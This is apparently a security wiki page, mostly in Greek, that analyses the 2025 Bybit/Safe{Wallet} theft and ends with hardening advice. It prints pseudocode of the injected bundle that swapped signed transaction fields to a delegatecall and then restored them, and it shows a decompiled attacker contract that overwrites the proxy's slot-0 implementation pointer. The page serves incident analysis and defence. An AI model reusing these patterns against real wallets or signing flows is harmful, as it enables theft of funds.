# Παραβίαση ροής υπογραφής Web3 & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## Επισκόπηση

Μια αλυσίδα κλοπής cold-wallet συνδύασε ένα **supply-chain compromise του Safe{Wallet} web UI** με ένα **on-chain delegatecall primitive που αντικατέστησε τον implementation pointer του proxy (slot 0)**. Τα βασικά συμπεράσματα είναι:

- Εάν ένα dApp μπορεί να εισάγει κώδικα στη signing path, μπορεί να αναγκάσει έναν signer να παράξει μια έγκυρη **EIP-712 signature over attacker-chosen fields** ενώ ταυτόχρονα επαναφέρει τα αρχικά δεδομένα του UI ώστε οι υπόλοιποι signers να μην αντιληφθούν.
- Τα Safe proxies αποθηκεύουν το `masterCopy` (implementation) στο **storage slot 0**. Ένα delegatecall προς ένα contract που γράφει στο slot 0 στην πράξη «αναβαθμίζει» το Safe στην attacker logic, παρέχοντας πλήρη έλεγχο του wallet.

## Off-chain: Στοχευμένη μεταβολή υπογραφής στο Safe{Wallet}

Ένα τροποποιημένο Safe bundle (`_app-*.js`) επιτέθηκε επιλεκτικά σε συγκεκριμένες διευθύνσεις Safe + signer. Ο injected κώδικας εκτελούνταν αμέσως πριν την κλήση υπογραφής:
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Ιδιότητες της επίθεσης
- **Context-gated**: hard-coded allowlists για τα θύματα Safes/signers απέτρεψαν θόρυβο και μείωσαν την ανίχνευση.
- **Last-moment mutation**: τα πεδία (`to`, `data`, `operation`, gas) επανεγράφησαν αμέσως πριν το `signTransaction`, και στη συνέχεια επανήλθαν, έτσι τα payloads προτάσεων στο UI φαίνονταν αβλαβή ενώ οι υπογραφές αντιστοιχούσαν στο payload του επιτιθέμενου.
- **EIP-712 opacity**: τα wallets εμφάνιζαν structured data αλλά δεν αποκωδικοποιούσαν nested calldata ούτε επισήμαιναν το `operation = delegatecall`, κάνοντας το μεταβληθέν μήνυμα ουσιαστικά blind-signed.

### Σχετικότητα της επικύρωσης στο Gateway
Οι προτάσεις Safe υποβάλλονται στο **Safe Client Gateway**. Πριν από τους ενισχυμένους ελέγχους, το gateway μπορούσε να αποδεχτεί μια πρόταση όπου το `safeTxHash`/υπογραφή αντιστοιχούσε σε διαφορετικά πεδία από το JSON σώμα εάν το UI τα επανέγραφε μετά την υπογραφή. Μετά το περιστατικό, το gateway πλέον απορρίπτει προτάσεις των οποίων το hash/υπογραφή δεν ταιριάζει με την υποβληθείσα συναλλαγή. Αντίστοιχη επαλήθευση hash στην πλευρά του server πρέπει να επιβληθεί σε οποιοδήποτε signing-orchestration API.

### 2025 Bybit/Safe incident highlights
- The February 21, 2025 Bybit cold-wallet drain (~401k ETH) reused the same pattern: a compromised Safe S3 bundle only triggered for Bybit signers and swapped `operation=0` → `1`, pointing `to` at a pre-deployed attacker contract that writes slot 0.
- Wayback-cached `_app-52c9031bfa03da47.js` shows the logic keyed on Bybit’s Safe (`0x1db9…cf4`) and signer addresses, then immediately rolled back to a clean bundle two minutes after execution, mirroring the “mutate → sign → restore” trick.
- The malicious contract (e.g., `0x9622…c7242`) contained simple functions `sweepETH/sweepERC20` plus a `transfer(address,uint256)` that writes the implementation slot. Execution of `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` shifted the proxy implementation and granted full control.

## On-chain: Delegatecall proxy takeover via slot collision

Safe proxies keep `masterCopy` at **storage slot 0** and delegate all logic to it. Because Safe supports **`operation = 1` (delegatecall)**, any signed transaction can point to an arbitrary contract and execute its code in the proxy’s storage context.

Ένα attacker contract μιμήθηκε ένα ERC-20 `transfer(address,uint256)` αλλά αντί για αυτό έγραφε το `_to` στο slot 0:
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Μονοπάτι εκτέλεσης:
1. Τα θύματα υπογράφουν `execTransaction` με `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Το Safe masterCopy επικυρώνει τις υπογραφές πάνω σε αυτές τις παραμέτρους.
3. Το Proxy εκτελεί delegatecall προς `attackerContract`; το σώμα του `transfer` γράφει στο slot 0.
4. Το Slot 0 (`masterCopy`) τώρα δείχνει σε λογική ελεγχόμενη από attacker → **full wallet takeover and fund drain**.

### Σημειώσεις Guard & έκδοσης (σκληραγώγηση μετά το περιστατικό)
- Safes >= v1.3.0 μπορούν να εγκαταστήσουν μια **Guard** για να απορρίψουν `delegatecall` ή να επιβάλλουν ACLs στο `to`/selectors; Η Bybit έτρεχε v1.1.1, οπότε δεν υπήρχε hook Guard. Η αναβάθμιση των contracts (και η επαναπροσθήκη των owners) απαιτείται για να αποκτήσετε αυτό το control plane.

## Έλεγχος ανίχνευσης και σκληραγώγησης

- **UI integrity**: κάντε pin τα JS assets / SRI; παρακολουθήστε διαφορές στο bundle; θεωρήστε το signing UI μέρος των ορίων εμπιστοσύνης.
- **Sign-time validation**: hardware wallets με **EIP-712 clear-signing**; αποδώστε ρητά το `operation` και αποκωδικοποιήστε nested calldata. Απορρίψτε την υπογραφή όταν `operation = 1` εκτός αν η πολιτική το επιτρέπει.
- **Server-side hash checks**: gateways/services που προωθούν προτάσεις πρέπει να επανυπολογίζουν το `safeTxHash` και να επικυρώνουν ότι οι υπογραφές ταιριάζουν με τα υποβληθέντα πεδία.
- **Policy/allowlists**: κανόνες preflight για `to`, selectors, τύπους assets, και απαγορέψτε το delegatecall εκτός από ελεγμένες ροές. Απαιτήστε ένα εσωτερικό policy service πριν τη μετάδοση πλήρως υπογεγραμμένων συναλλαγών.
- **Contract design**: αποφύγετε την έκθεση αυθαίρετου delegatecall σε multisig/treasury wallets εκτός αν είναι απολύτως απαραίτητο. Τοποθετήστε pointers αναβάθμισης μακριά από το slot 0 ή προστατέψτε τα με ρητή λογική αναβάθμισης και access control.
- **Monitoring**: ειδοποιήστε για εκτελέσεις delegatecall από πορτοφόλια που κρατούν treasury funds, και για προτάσεις που αλλάζουν το `operation` από τυπικά `call` πρότυπα.

## References

- [AnChain.AI forensic breakdown of the Bybit Safe exploit](https://www.anchain.ai/blog/bybit)
- [Zero Hour Technology analysis of the Safe bundle compromise](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
